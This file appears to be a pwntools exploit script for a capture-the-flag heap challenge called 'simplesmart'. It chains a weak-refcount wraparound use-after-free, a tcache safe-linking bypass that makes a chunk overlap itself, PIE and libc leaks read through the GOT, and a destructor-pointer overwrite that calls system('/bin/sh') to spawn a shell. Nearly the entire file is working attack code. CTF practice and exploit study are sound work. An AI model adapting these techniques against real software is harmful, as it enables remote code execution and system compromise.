#!/usr/bin/env python3

from pwn import *

e = ELF("./simplesmart_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = e

# context.terminal =  ['tmux', 'new-window', '-n', 'GDB']
# spawn new window
# context.terminal = ["tmux", "neww", "-n", "shell"]
context.terminal = ["tmux", "splitw", "-h"]


# context.log_level = "debug"
DOCKER_PORT		= 1337
REMOTE_NC_CMD	= "nc simplesmart.challs.ctf.bhackari.it 5003"


ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
bstr = lambda x: str(x).encode()
aleak = lambda elfname, addr: log.info(elfname + " @ 0x" + format(addr, 'x'))
vleak = lambda valname, val: log.info(valname + " @ 0x" + format(val, 'x'))
chunks = lambda data: [data[i:i+context.bytes] for i in range(0, len(data), context.bytes)]

GDB_SCRIPT = """
    # b *show_metadata
"""

def start():
	if args.GDB:
		r = gdb.debug(e.path,gdbscript=GDB_SCRIPT)
	elif args.LOCAL:
		r = process(e.path)
	elif args.DOCKER:
		r = remote("localhost", DOCKER_PORT)
	else:
		r = remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

	return r

r = None

ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)



A_CB_LOW      = 0xc0 # fixed offset for the first allocation
A_PAYLOAD_LOW = 0xc0 + 0x30 # dist from the A cb (info struct) -> A payload
# A,cb = 0x20 + 0x8 bytes for the header -> aligned: 0x30

# menu utilities

def menu():
	data = ru(b'> ', timeout=10)
	
	return data

def cmd(n):
	menu()
	sl(str(n).encode())

def create_strong(pos, size):
	cmd(1)
	ru(b'pos: ')
	sl(str(pos).encode())
	ru(b'size: ')
	sl(str(size).encode())

def copy_strong(sid, pos):
	cmd(2)
	ru(b'sid: ')
	sl(str(sid).encode())
	ru(b'pos: ')
	sl(str(pos).encode())

def release_strong(pos):
	cmd(3)
	ru(b'pos: ')
	sl(str(pos).encode())

def create_weak(sid, pos):
	cmd(4)
	ru(b'sid: ')
	sl(str(sid).encode())
	ru(b'pos: ')
	sl(str(pos).encode())

def release_weak(pos):
	cmd(5)
	ru(b'pos: ')
	sl(str(pos).encode())

def info(typ, pos):
	cmd(6)
	ru(b'type (1=strong / 2=weak): ')
	sl(str(typ).encode())
	ru(b'pos: ')
	sl(str(pos).encode())
	line = rl()
	m = re.search(rb'strong = (\d+);  weak = (\d+);  payload size = (\d+)', line)
	if not m:
		log.error(f'bad metadata line: {line}')
	# order in show_metadata is cb[1], cb[0], cb[2].
	return tuple(map(int, m.groups()))

def read_weak(pos, n):
	cmd(7)
	ru(b'pos: ')
	sl(str(pos).encode())
	return r.recvn(n)

def write_strong(pos, data):
	cmd(8)
	ru(b'pos: ')
	sl(str(pos).encode())
	ru(b'data: ')
	sn(data)


# create a control block for a strong ptr
def make_cb(weak=1, strong=1, size=8, dtor=0, payload=0):
    return flat({
        0x00: p8(weak & 0xff), # weak counter
        0x01: p8(strong & 0xff), # strong counter
        0x02: p8(size & 0xff),
        0x10: p64(dtor & 0xffffffffffffffff), # function called when the ptr is freed
        0x18: p64(payload & 0xffffffffffffffff), # chunk data
    }, length=0x20)


# context.log_level = 'debug'


def build_self_overlap():
    create_strong(0, 0x20)  # A
    create_strong(1, 0x20)  # B

    log.info('ow A->weak_counter so it wraps to 0')
    for i in range(255):
        create_weak(0, i)

    # i can free A (release strong) even if there are still 255 weak ptrs allocated -> i have a dangling heap ptr
    # -> uaf on the control block
 
    log.info('releasing A')
    release_strong(0)

    shown_strong, shown_weak, shown_size = info(2, 0) # leak heap by reading the dangling weak ptr
    # r.interactive()
    aleak('strong', shown_strong)
    aleak('weak', shown_weak)
    aleak('size', shown_size)
    cur = shown_weak  # first field of the struct (cb[0]) => now it's the low byte of safe-linked tcache fd in freed A.cb


    # A.cb -> A.payload, we want A.cb pointing to itself so malloc will return the same chunk 2 times
    # (self overlap)
    want = cur ^ A_PAYLOAD_LOW ^ A_CB_LOW  # bypass safe linking and set A.cb->A.cb

    log.info(f'freed A.cb: strong={shown_strong:#x} weak={shown_weak:#x} size={shown_size:#x}')
    log.info(f'wanted poisoned low byte: {want:#x}')

    # main checks cb[1] before weak_release; if zero, release_weak exits.
    if shown_strong == 0:
        raise ValueError('bad tcache byte')
    if want > cur:
        raise ValueError('bad low byte for poison')

    dec = cur - want
    if dec == 0:
        raise ValueError('dec=0')

    pause()
    log.info(f'decrementing {dec} times')

    # i want to dec the fd until it becomes the addr i want!
    for wid in range(1, 1 + dec):
        release_weak(wid)

    after = info(2, 0)
    log.info(f'after poison fields: {after}')
    if after[1] != want:
        raise ValueError(f'poison failed: wanted cb0={want:#x}, got cb0={after[1]:#x}')

    pause()

    # make_strong does: malloc control block -> old A.cb, malloc payload -> old A.cb.
    # telescope address in tcache 0x30: offset 0x18 there will be the control block (same address as telescope)
    # 0x10: payload dtor = bin address that i can leak
    create_strong(2, 0x20)
    log.success('self-overlap achieved: strong[2].control_block == strong[2].payload')
    pause()

    # weak[0] still points to old A.cb, now C.cb. 
    # so i can read the control block of C
    raw = read_weak(0, 0x20)
    payload_dtor = u64(raw[0x10:0x18])
    c_cb = u64(raw[0x18:0x20])

    e.address = payload_dtor - e.sym.payload_dtor
    b_cb = c_cb + 0x80 # (32 * 4) = offset block B

    log.success(f'payload_dtor = {payload_dtor:#x}')
    log.success(f'PIE base     = {e.address:#x}')
    log.success(f'C.cb heap    = {c_cb:#x}')
    log.success(f'B.cb heap    = {b_cb:#x}')

    return c_cb, b_cb, 1

def set_b_cb(size=8, dtor=0, payload=0, weak=1, strong=1):
            # C->payload = B.cb -> use the write to overwrite B.control_block
            write_strong(2, make_cb(weak=weak, strong=strong, size=size,
                                      dtor=dtor, payload=payload))



def solve():
	try:
		global r
		r = start()
		# with write_strong i only write into strong->cb->payload
		# find a way to change the function called when the strong ptr is freed to system
		
		# self overlap a cb (C.cb->payload = C.cb) -> write_strong writes directly into C.cb
		c_cb, b_cb, b_wid = build_self_overlap()

		# C is self-overlapped
		# i overwrite C.cb with a fake struct to have 
        # C.cb->payload = B.cb -> i can fully control B control block!
		write_strong(2, make_cb(weak=1, strong=1, size=0x20, dtor=e.sym.payload_dtor, payload=b_cb))
        # pause()

		# i need a libc leak
		# create a real weak pointer (with read_weak i have arb read)
		create_weak(1, b_wid)
        # pause()
	
		free_got = e.got['free']
		log.info(f'free @ GOT = {free_got:#x}')

		# leak libc free by reading the got
		# free_leak = u64(arb_read(free_got, 8, b_wid).ljust(8, b'\x00'))
        # create another control block
		set_b_cb(size=8, dtor=e.sym.payload_dtor, payload=free_got, weak=1, strong=1)
		free_leak = u64(read_weak(b_wid, 8).ljust(8, b'\x00'))


		if (free_leak >> 40) not in (0x7f, 0x7e):
			raise ValueError(f'bad libc free leak: {free_leak:#x}')

		libc.address = free_leak - libc.sym['free']
		system = libc.sym['system']


		aleak('free', free_leak)
		aleak('libc', libc.address)
		aleak('system', system)

		# overwrite dtor with system and payload (= dtor arg) with binsh
		set_b_cb(size=8, dtor=system, payload=libc.binsh(), weak=1, strong=1)
		release_strong(1)

		sl(b'id')
		try:
			data = r.recv()
		except Exception:
			pass
		r.interactive()
		return True

	except Exception as exc:
		log.warning(str(exc))
		r.close()
		r = start()
		return False

def main():
	# log.info(f'payload_dtor offset: {exe.sym.payload_dtor:#x}')
	# log.info(f'free offset: {exe.got["free"]:#x}')
	for attempt in range(50):
		log.info(f'attempt {attempt}')
		if solve():
			return
	log.failure('failed')
	r.interactive()


if __name__ == "__main__":
	main()
